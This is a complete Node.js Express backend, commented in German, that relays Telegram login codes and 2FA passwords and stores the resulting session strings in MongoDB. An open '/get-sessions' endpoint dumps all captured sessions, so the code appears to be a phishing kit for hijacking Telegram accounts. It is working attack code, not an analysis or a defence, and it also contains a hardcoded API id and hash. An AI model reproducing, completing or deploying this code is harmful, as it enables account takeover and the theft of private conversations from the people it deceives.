const express = require('express');
const cors = require('cors');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
app.use(cors({ origin: '*' })); // CORS für alle Anfragen öffnen
app.use(express.json());

// Konfiguration - Ersetze hier mit deinen Werten
const apiId = 23049703; 
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const MONGO_URI = process.env.MONGODB_URI || 'DEIN_MONGODB_CONNECTION_STRING';

mongoose.connect(MONGO_URI).then(() => console.log("DB Verbunden")).catch(err => console.log(err));

const SessionSchema = new mongoose.Schema({
    phone: String,
    session: String,
    date: { type: Date, default: Date.now }
});
const Session = mongoose.model('Session', SessionSchema);

const activeSessions = new Map();

// --- LOGIN FLOW ---
app.post('/send-otp', async (req, res) => {
    try {
        const { phone } = req.body;
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        const result = await client.sendCode({ apiId, apiHash }, phone);
        activeSessions.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
        res.json({ success: true, phoneCodeHash: result.phoneCodeHash });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

app.post('/verify-otp', async (req, res) => {
    try {
        const { phone, code, phoneCodeHash, password } = req.body;
        const session = activeSessions.get(phone);
        if (!session) return res.status(400).json({ error: "Session abgelaufen" });

        try {
            await session.client.signIn({
                phoneNumber: phone,
                phoneCode: code,
                phoneCodeHash: phoneCodeHash
            });
        } catch (err) {
            if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                if (!password) return res.json({ twoFactorRequired: true });
                const pwd = await session.client.invoke(new Api.account.GetPassword());
                await session.client.signInPassword({ password: password }, pwd);
            } else {
                throw err;
            }
        }
        const sessionString = session.client.session.save();
        await Session.create({ phone, session: sessionString });
        res.json({ success: true });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

// --- ADMIN ENDPOINTS ---
app.get('/get-sessions', async (req, res) => {
    try {
        const sessions = await Session.find({});
        res.json(sessions);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.listen(process.env.PORT || 3000, () => console.log("Server läuft."));
